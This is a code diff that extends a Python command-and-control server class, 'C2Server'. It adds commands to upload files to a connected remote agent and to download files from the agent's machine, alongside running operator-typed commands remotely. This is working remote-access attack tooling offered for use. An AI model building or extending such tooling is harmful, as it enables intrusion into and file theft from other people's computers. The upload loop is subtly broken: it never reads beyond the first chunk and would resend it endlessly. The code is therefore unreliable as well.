@@ -1,3 +1,4 @@
+import os
 import socket
 
 
@@ -5,12 +6,21 @@ class C2Server:
     def __init__(self, host, port):
         self.host = host
         self.port = port
-
         self.start_server()
+
+    def receive_file(self, conn, filename):
+        with open(filename, "wb") as f:
+            while True:
+                data = conn.recv(1024)
+                if b"[ENDFILE]" in data:
+                    f.write(data.replace(b"[ENDFILE]", b""))
+                    break
+                f.write(data)
 
     def start_server(self):
         serversocket = socket.socket()
         assert self.host and self.port, "Host and port must be specified"
+        serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         serversocket.bind((self.host, self.port))
         serversocket.listen(1)
         print(f"[*] Listening on {self.host}:{self.port}")
@@ -20,12 +30,40 @@ class C2Server:
             print(f"[*] Connection from {addr}")
 
             while True:
-                command = input("console> ")
+                command = input("console> ").strip()
+
                 if command.lower() in ["exit", "quit"]:
                     conn.send(b"exit")
                     break
 
+                if command.startswith("upload "):
+                    filename = command.split(" ", 1)[1]
+                    if not os.path.exists(filename):
+                        print(f"[!] File not found: {filename}")
+                        continue
+
+                    conn.send(command.encode())
+                    ready = conn.recv(1024)
+                    if b"[READYFORFILE]" not in ready:
+                        print("[!] Agent not ready to receive file.")
+                        continue
+
+                    with open(filename, "rb") as f:
+                        chunk = f.read(1024)
+                        while chunk:
+                            conn.sendall(chunk)
+                        conn.sendall(b"[ENDFILE]")
+                    print(f"[+] Sent file: {filename}")
+                    continue
+
                 conn.send(command.encode())
+
+                if command.startswith("download "):
+                    filename = command.split(" ", 1)[1]
+                    self.receive_file(conn, filename)
+                    print(f"[+] Received file: {filename}")
+                    continue
+
                 output = conn.recv(4096).decode()
                 print(output)
 
